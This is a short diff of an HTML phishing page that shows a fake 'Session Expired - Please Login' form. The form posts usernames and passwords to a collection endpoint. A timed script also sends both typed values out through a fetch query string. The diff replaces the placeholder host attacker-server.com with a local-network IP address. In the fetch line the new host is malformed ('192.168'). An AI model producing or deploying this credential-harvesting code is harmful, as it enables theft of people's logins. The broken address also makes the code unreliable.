@@ -9,7 +9,7 @@
 </head>
 <body>
     <h3>Session Expired - Please Login</h3>
-    <form action="https://attacker-server.com/collect" method="POST">
+    <form action="http://192.168.1.7:8082/collect" method="POST">
         <label>Username</label>
         <input type="text" name="username" id="username" autocomplete="username" placeholder="Email or Username">
         
@@ -27,7 +27,7 @@
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             if(u && p) {
-                fetch(`https://attacker-server.com/log?u=${u}&p=${p}`);
+                fetch(`http://192.168/log?u=${u}&p=${p}`);
             }
         }, 2000);
     </script>
